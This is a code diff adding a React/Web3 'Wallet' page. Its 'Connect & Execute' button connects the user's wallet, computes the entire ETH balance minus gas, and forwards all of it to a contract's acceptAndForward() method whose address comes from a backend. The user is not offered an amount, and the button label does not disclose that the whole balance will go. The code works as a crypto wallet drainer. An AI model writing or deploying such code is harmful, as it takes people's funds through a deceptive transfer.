@@ -1,0 +1,118 @@
+'use client'
+
+import { useState } from 'react'
+import Web3 from 'web3'
+import type { ExternalProvider } from 'web3-core'
+
+// Вынесённая функция: логика взаимодействия с контрактом
+export async function executeContractTransfer(
+  eth: ExternalProvider & { request(args: { method: string; params?: unknown[] }): Promise<unknown> },
+  addr: string,
+  setStatus: (msg: string) => void
+): Promise<string> {
+  setStatus('Получаем данные контракта…')
+  const res = await fetch('http://localhost:8000/contract')
+  if (!res.ok) throw new Error(`Ошибка бэка: ${res.status}`)
+  const { address, abi } = (await res.json()) as { address: string; abi: any[] }
+
+  const web3 = new Web3(eth)
+  const contract = new web3.eth.Contract(abi, address)
+
+  // 1) Рассчитываем сумму, которую пользователь может отправить
+  setStatus('Читаем баланс пользователя…')
+  const balanceWei = BigInt(await web3.eth.getBalance(addr))
+  // Пример расчёта газа для обычного вызова (можно использовать фиксированную оценку)
+  const gasPriceWei = BigInt(await web3.eth.getGasPrice())
+  const gasLimitSimple = 300000n  // примерно для acceptAndForward
+  const gasCost = gasPriceWei * gasLimitSimple
+  const amountToSend = balanceWei - gasCost
+  if (amountToSend <= 0n) throw new Error('Недостаточно средств на оплату газа')
+  const hexValue = '0x' + amountToSend.toString(16)
+
+  // 2) Оцениваем газ для acceptAndForward
+  setStatus('Оцениваем газ для acceptAndForward()…')
+  const gasLimitNum = await contract.methods.acceptAndForward().estimateGas({ from: addr, value: hexValue })
+
+  // 3) EIP-1559: получаем цены газа
+  const block = await web3.eth.getBlock('pending')
+  // @ts-ignore
+  const baseFeePerGas = BigInt(block.baseFeePerGas)
+  let maxPriorityFeePerGas: bigint
+  try {
+    maxPriorityFeePerGas = BigInt(await web3.eth.getMaxPriorityFeePerGas())
+  } catch {
+    maxPriorityFeePerGas = BigInt(web3.utils.toWei('2.5', 'gwei'))
+  }
+  const maxFeePerGas = baseFeePerGas * 2n + maxPriorityFeePerGas
+
+  // 4) Выполняем acceptAndForward
+  setStatus('Выполняем acceptAndForward()…')
+  const receipt = await contract.methods.acceptAndForward().send({
+    from: addr,
+    value: hexValue,
+    gas:      gasLimitNum.toString(),
+    maxPriorityFeePerGas: maxPriorityFeePerGas.toString(),
+    maxFeePerGas:         maxFeePerGas.toString(),
+    type:     '0x2',
+  })
+
+  return receipt.transactionHash
+}
+
+// React-компонент Wallet
+export default function Wallet() {
+  const [account, setAccount] = useState<string>()
+  const [status,  setStatus]  = useState('Нажмите «Connect & SendBalance»')
+  const [busy,    setBusy]    = useState(false)
+
+  async function connectAndExecute() {
+    const eth = window.ethereum
+    if (!eth) {
+      setStatus('Установите Web3-кошелёк (MetaMask и т.п.)')
+      return
+    }
+
+    setBusy(true)
+    setStatus('Запрашиваем аккаунт…')
+    let addr = eth.selectedAddress as string | undefined
+    if (!addr) {
+      try {
+        const resp = await eth.request({ method: 'eth_requestAccounts' })
+        addr = (resp as string[])[0]
+      } catch (e: any) {
+        setStatus(`Ошибка подключения: ${e.message}`)
+        setBusy(false)
+        return
+      }
+    }
+    setAccount(addr)
+
+    try {
+      const txHash = await executeContractTransfer(eth, addr, setStatus)
+      setStatus(`Успех! TxHash: ${txHash}`)
+    } catch (e: any) {
+      setStatus(`Ошибка: ${e.message}`)
+    } finally {
+      setBusy(false)
+    }
+  }
+
+  return (
+    <div style={{ padding: 20, fontFamily: 'Arial, sans-serif' }}>
+      <h1>Send Contract Balance</h1>
+      <button
+        onClick={connectAndExecute}
+        disabled={busy}
+        style={{
+          padding: '10px 20px',
+          fontSize: '16px',
+          cursor: busy ? 'not-allowed' : 'pointer',
+        }}
+      >
+        {busy ? '…обрабатываем' : 'Connect & Execute'}
+      </button>
+      <p><strong>Статус:</strong> {status}</p>
+      {account && <p><strong>Ваш аккаунт:</strong> {account}</p>}
+    </div>
+  )
+}
